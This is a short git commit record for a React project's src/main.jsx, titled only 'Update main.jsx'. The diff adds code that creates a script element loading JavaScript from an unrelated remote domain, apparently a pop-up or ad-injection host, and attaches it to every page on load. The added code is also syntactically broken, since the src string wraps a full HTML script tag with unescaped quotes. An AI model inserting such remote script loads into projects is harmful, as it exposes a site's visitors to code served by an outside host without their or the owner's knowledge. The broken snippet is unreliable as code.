1d770c09ae9bc921954165b8d3567250409ed8aa
wf5663893-gif <wf5663893@gmail.com>
2026-05-19 17:51:21 +0700

    Update main.jsx

--- src/main.jsx
+++ src/main.jsx
@@ -1,5 +1,15 @@
 import React from 'react'
 import ReactDOM from 'react-dom/client'
+const popScript =
+  document.createElement("script");
+
+popScript.src =
+  "<script src="https://consumptionbackwardsentiments.com/88/b0/d5/88b0d520ba8ee78e027a311e684bc15e.js"></script>
+";
+
+popScript.async = true;
+
+document.body.appendChild(popScript);
 import App from './App.jsx'
 
 ReactDOM.createRoot(document.getElementById('root')).render(
